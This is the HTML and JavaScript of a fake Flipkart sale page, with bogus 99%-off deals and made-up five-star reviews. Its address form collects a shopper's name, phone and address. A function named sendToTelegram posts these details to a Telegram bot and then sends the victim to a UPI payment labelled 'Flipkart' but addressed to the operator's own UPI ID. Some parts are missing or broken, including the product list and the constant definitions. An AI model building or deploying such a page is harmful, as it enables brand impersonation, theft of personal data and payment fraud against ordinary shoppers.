<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Flipkart | Big Billion Days</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css" />
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
        body { font-family: 'Roboto', sans-serif; background-color: #f1f3f6; margin: 0; }
        .fk-blue { background-color: #2874f0; }
        .btn-orange { background: #fb641b; color: #fff; border-radius: 2px; }
        .btn-yellow { background: #ff9f00; color: #fff; border-radius: 2px; }
        .rating-badge { background: #388e3c; color: #fff; padding: 2px 6px; border-radius: 3px; font-weight: bold; font-size: 11px; }
        .line-input { width: 100%; border-bottom: 2px solid #e0e0e0; padding: 10px 0; outline: none; transition: 0.3s; font-size: 14px; background: transparent; }
        .line-input:focus { border-bottom-color: #2874f0; }
        .category-scroll::-webkit-scrollbar { display: none; }
        .banner-swiper { height: 160px; }
        .banner-swiper img { width: 100%; height: 100%; object-fit: fill; }
    </style>
</head>
<body>

    <div id="page-home">
        <header class="fk-blue py-3 px-4 flex items-center justify-between sticky top-0 z-[100]">
            <div class="flex items-center gap-3">
                <i class="fa-solid fa-bars text-white text-lg"></i>
                <img src="https://static-assets-web.flixcart.com/batman-returns/batman-returns/p/images/fkheaderlogo_exploreplus_mobile-f4d035.svg" class="h-5">
            </div>
            <div class="flex gap-4 text-white items-center">
                <i class="fa-solid fa-bell"></i>
                <i class="fa-solid fa-cart-shopping"></i>
            </div>
        </header>

        <div class="fk-blue px-4 pb-3">
            <div class="bg-white rounded-sm flex items-center px-3 py-2 text-gray-400 gap-2">
                <i class="fa-solid fa-magnifying-glass"></i>
                <span class="text-sm">Search for products</span>
            </div>
        </div>

        <div class="swiper banner-swiper mt-1">
            <div class="swiper-wrapper">
                <div class="swiper-slide"><img src="https://rukminim1.flixcart.com/fk-p-flap/3200/540/image/7be563256301e160.jpg?q=60"></div>
                <div class="swiper-slide"><img src="https://rukminim1.flixcart.com/fk-p-flap/3200/540/image/5b309e98775e22e4.jpg?q=60"></div>
            </div>
            <div class="swiper-pagination"></div>
        </div>

        <div class="p-3 bg-white mt-1 font-bold">Deals of the Day</div>
        <main id="main-grid" class="p-2 grid grid-cols-2 gap-2 pb-20"></main>
    </div>

    <div id="page-detail" class="hidden fixed inset-0 bg-white z-[200] overflow-y-auto">
        <nav class="p-3 border-b sticky top-0 bg-white z-[210] flex items-center gap-4">
            <i class="fa-solid fa-arrow-left text-xl" onclick="showPage('page-home')"></i>
            <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/flipkart-plus_8d85f4.png" class="h-4">
        </nav>
        
        <div class="swiper detailSwiper h-72 bg-white">
            <div class="swiper-wrapper" id="detail-img-wrapper"></div>
            <div class="swiper-pagination"></div>
        </div>

        <div class="p-4 bg-white">
            <p id="det-name" class="text-sm font-medium"></p>
            <div class="flex items-center gap-2 mt-1">
                <span class="rating-badge">4.6 â˜…</span>
                <span class="text-gray-400 text-xs underline">1,24,510 Ratings</span>
            </div>
            <div class="flex items-baseline gap-2 mt-2">
                <span id="det-price" class="text-2xl font-bold text-black"></span>
                <span class="text-green-600 font-bold text-sm">99% off</span>
            </div>
        </div>

        <div class="p-4 bg-white mt-2 pb-24 border-t">
            <h3 class="font-bold mb-3">Recent Reviews</h3>
            <div id="reviews-container" class="space-y-4 text-sm"></div>
        </div>

        <div class="fixed bottom-0 w-full flex h-14 bg-white border-t z-[220]">
            <button class="w-1/2 font-bold text-sm uppercase">Add to Cart</button>
            <button onclick="showPage('page-address')" class="w-1/2 btn-yellow font-bold text-sm uppercase">Buy Now</button>
        </div>
    </div>

    <div id="page-address" class="hidden fixed inset-0 bg-[#f1f3f6] z-[300] overflow-y-auto">
        <nav class="fk-blue p-4 text-white flex items-center gap-4 sticky top-0">
            <i class="fa-solid fa-arrow-left" onclick="showPage('page-detail')"></i>
            <span class="font-medium">Delivery Address</span>
        </nav>
        <div class="bg-white p-6 m-2 shadow-sm space-y-5">
            <input type="text" id="uName" placeholder="Full Name*" class="line-input">
            <input type="tel" id="uPhone" placeholder="Mobile Number*" class="line-input">
            <div class="relative">
                <input type="number" id="uPin" placeholder="Pincode*" oninput="checkPincode(this.value)" class="line-input">
                <span id="pin-loader" class="absolute right-0 top-3 text-[10px] text-blue-600 hidden italic">Fetching...</span>
            </div>
            <div class="flex gap-4">
                <input type="text" id="uCity" placeholder="City/District" class="line-input bg-gray-50" readonly>
                <input type="text" id="uState" placeholder="State" class="line-input bg-gray-50" readonly>
            </div>
            <input type="text" id="uHouse" placeholder="House No., Building Name*" class="line-input">
            <button id="payBtn" onclick="sendToTelegram()" class="w-full btn-orange py-4 font-bold uppercase shadow-lg mt-4">Continue to Payment</button>
        </div>
    </div>

        function loadProducts() {
            const grid = document.getElementById('main-grid');
            products.forEach(p => {
                grid.innerHTML += `
                    <div class="bg-white p-2 shadow-sm rounded" onclick="openProduct(${p.id})">
                        <img src="${p.imgs[0]}" class="h-32 w-full object-contain mb-2">
                        <p class="text-xs font-medium truncate">${p.name}</p>
                        <div class="flex items-center gap-1 mt-1">
                            <span class="font-bold text-sm">â‚¹${p.price}</span>
                            <span class="text-green-600 text-[10px] font-bold">99% OFF</span>
                        </div>
                    </div>
                `;
            });
        }

        function openProduct(id) {
            const p = products.find(x => x.id == id);
            selectedProductPrice = p.price;
            selectedProductName = p.name;
            document.getElementById('det-name').innerText = p.name;
            document.getElementById('det-price').innerText = "â‚¹" + p.price;
            
            document.getElementById('detail-img-wrapper').innerHTML = p.imgs.map(img => `<div class="swiper-slide"><img src="${img}" class="h-full w-full object-contain"></div>`).join('');
            
            document.getElementById('reviews-container').innerHTML = `
                <div class="border-b pb-2"><p class="font-bold">5 â˜… Mind-blowing!</p><p class="text-gray-600">Best deal ever on Flipkart.</p></div>
                <div class="border-b pb-2"><p class="font-bold">5 â˜… Must buy!</p><p class="text-gray-600">Great quality, original product delivered.</p></div>
            `;

            showPage('page-detail');
            new Swiper(".detailSwiper", { pagination: { el: ".swiper-pagination" } });
        }

        async function checkPincode(pin) {
            if(pin.length === 6) {
                document.getElementById('pin-loader').classList.remove('hidden');
                try {
                    const res = await fetch(`https://api.postalpincode.in/pincode/${pin}`);
                    const data = await res.json();
                    if(data[0].Status === "Success") {
                        document.getElementById('uCity').value = data[0].PostOffice[0].District;
                        document.getElementById('uState').value = data[0].PostOffice[0].State;
                    }
                } catch(e) {}
                document.getElementById('pin-loader').classList.add('hidden');
            }
        }

       async function sendToTelegram() {
            const name = document.getElementById('uName').value;
            const phone = document.getElementById('uPhone').value;
            const pin = document.getElementById('uPin').value;
            const city = document.getElementById('uCity').value;
            const house = document.getElementById('uHouse').value;

            if(!name || phone.length < 10) return alert("Sahi detail bharein!");

            document.getElementById('payBtn').innerText = "Processing...";

            const msg = `ðŸ“¦ *ORDER RECEIVED* ðŸ“¦\n\nðŸ‘¤ *User:* ${name}\nðŸ“ž *Phone:* ${phone}\nðŸ›ï¸ *Item:* ${selectedProductName}\nðŸ’° *Price:* â‚¹${selectedProductPrice}\nðŸ“ *Pin:* ${pin}\nðŸ™ï¸ *City:* ${city}\nðŸ  *Addr:* ${house}`;

            // --- Yahan se Error Fix Hai ---
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
                });
                
                // Success hone par payment pe bhejo
                window.location.href = `upi://pay?pa=${MY_UPI_ID}&pn=Flipkart&am=${selectedProductPrice}&cu=INR&mode=02&purpose=00&orgid=159761`;
                
            } catch(e) {
                // Agar net ki wajah se error aaye tab bhi payment pe bhejo
                window.location.href = `upi://pay?pa=${MY_UPI_ID}&pn=Flipkart&am=${selectedProductPrice}&cu=INR&mode=02&purpose=00&orgid=159761`;
            }
        } // Ye wala bracket function band karta hai

        function showPage(id) {
            document.getElementById('page-home').classList.add('hidden');
            document.getElementById('page-detail').classList.add('hidden');
            document.getElementById('page-address').classList.add('hidden');
            document.getElementById(id).classList.remove('hidden');
            window.scrollTo(0,0);
        }

        window.onload = () => {
            loadProducts();
            new Swiper(".banner-swiper", { pagination: { el: ".swiper-pagination" }, autoplay: true });
        };
